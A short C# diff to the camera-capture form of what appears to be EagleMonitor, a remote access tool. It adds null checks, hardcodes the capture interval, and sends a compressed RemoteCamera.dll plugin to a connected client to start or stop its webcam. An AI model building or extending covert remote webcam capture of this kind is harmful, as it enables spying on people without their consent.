@@ -39,13 +39,12 @@ namespace EagleMonitor.Forms
         {
             if (captureGuna2ToggleSwitch.Checked)
             {
-                if (camerasGuna2ComboBox.Items.Count > 0)
+                if (camerasGuna2ComboBox.Items.Count > 0 && camerasGuna2ComboBox.SelectedItem != null)
                 {
                     RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_ON);
 
                     remoteCameraCapturePacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteCamera.dll"), 1);
-                    int.TryParse(intervalGuna2TextBox.Text, out int interval);
-                    remoteCameraCapturePacket.timeMS = interval;
+                    remoteCameraCapturePacket.timeMS = 1;
                     remoteCameraCapturePacket.index = camerasGuna2ComboBox.SelectedIndex;
                     remoteCameraCapturePacket.quality = qualityGuna2TrackBar.Value;
                     this.loadingCircle1.Visible = true;
@@ -55,21 +54,24 @@ namespace EagleMonitor.Forms
             }
             else
             {
-                this.loadingCircle1.Visible = false;
-                this.loadingCircle1.Active = false;
-                RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_OFF);
-                this.clientHandler.SendPacket(remoteCameraCapturePacket);
+                if (clientHandler != null && camerasGuna2ComboBox.Items.Count > 0)
+                {
+                    this.loadingCircle1.Visible = false;
+                    this.loadingCircle1.Active = false;
+                    RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_OFF);
+                    this.clientHandler.SendPacket(remoteCameraCapturePacket);
+                }
             }
         }
 
         private void intervalGuna2TextBox_TextChanged(object sender, EventArgs e)
         {
-            if (int.TryParse(intervalGuna2TextBox.Text, out int interval) && captureGuna2ToggleSwitch.Checked)
+            if (captureGuna2ToggleSwitch.Checked)
             {
                 RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_ON);
 
                 remoteCameraCapturePacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteCamera.dll"), 1);
-                remoteCameraCapturePacket.timeMS = interval;
+                remoteCameraCapturePacket.timeMS = 1;
                 this.loadingCircle1.Visible = true;
                 this.loadingCircle1.Active = true;
 
